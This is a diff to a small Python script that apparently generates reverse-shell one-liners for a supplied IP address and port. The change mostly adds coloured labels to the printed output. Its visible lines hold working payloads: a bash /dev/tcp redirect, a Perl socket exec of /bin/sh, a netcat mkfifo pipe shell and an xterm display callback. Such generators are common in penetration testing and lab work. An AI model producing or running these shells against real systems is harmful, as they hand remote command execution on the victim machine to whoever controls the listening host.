@@ -7,7 +7,7 @@ if len(sys.argv) != 3:
 else:
     ip = str(sys.argv[1])
     port = sys.argv[2]
-    print ("Generating reverse shells for IP: " + ip + " on port " + port+"\n\n")
+    print ("\033[1;32m[*]Generating reverse shells for IP: " + ip + " on port " + port)
 
     bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
     perlLong = """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
@@ -18,10 +18,11 @@ else:
     nc2 = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
     xterm = """xterm -display """+ip+""":"""+port
 
-    print bash + "\n"
-    print perlLong + "\n"
-    print python + "\n"
-    print php + "\n"
-    print ruby + "\n"
-    print nc + "\n"
-    print nc2 + "\n"
+    print "\033[1;31m[*]BASH\033[1;m\n" + bash + "\n"
+    print "\033[1;31m[*]PERL\033[1;m\n" + perlLong + "\n"
+    print "\033[1;31m[*]PYTHON\033[1;m\n" + python + "\n"
+    print "\033[1;31m[*]PHP\033[1;m\n" + php + "\n"
+    print "\033[1;31m[*]RUBY\033[1;m\n" + ruby + "\n"
+    print "\033[1;31m[*]NETCAT\033[1;m\n" + nc + "\n"
+    print "\033[1;31m[*]NETCAT WITH MKFIFO\033[1;m\n" + nc2 + "\n"
+    print "\033[1;31m[*]XTERM\033[1;m\n" + xterm + "\n"
